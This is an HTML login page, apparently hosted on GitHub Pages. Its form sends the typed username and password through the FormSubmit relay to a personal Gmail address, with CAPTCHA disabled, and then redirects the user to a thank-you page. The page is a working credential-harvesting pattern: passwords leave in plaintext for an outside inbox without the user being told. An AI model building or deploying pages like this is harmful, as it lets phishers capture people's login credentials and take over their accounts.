<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Login (send to email)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{font-family:Arial;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;
      background:#f4f7fb}
    .box{background:#fff;padding:24px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.08);width:320px}
    input{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ddd}
    button{width:100%;padding:10px;border:none;border-radius:6px;background:#0b74ff;color:#fff;font-weight:600}
  </style>
</head>
<body>
  <!--
    Sends form to your email via FormSubmit.
    Replace _next with a valid page in your repo (thankyou page)
  -->
  <form action="https://formsubmit.co/adreshtakudu@gmail.com" method="POST" class="box">
    <!-- optional: turn off FormSubmit captcha -->
    <input type="hidden" name="_captcha" value="false">
    <!-- redirect after submit -->
    <input type="hidden" name="_next" value="https://adarshab-43.github.io/Loginpage/thankyou.html">
    <!-- optional: set an email subject -->
    <input type="hidden" name="_subject" value="Login page submission">

    <h3 style="margin:0 0 12px 0;text-align:center">Login</h3>

    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>

    <button type="submit">Login</button>
  </form>
</body>
</html>
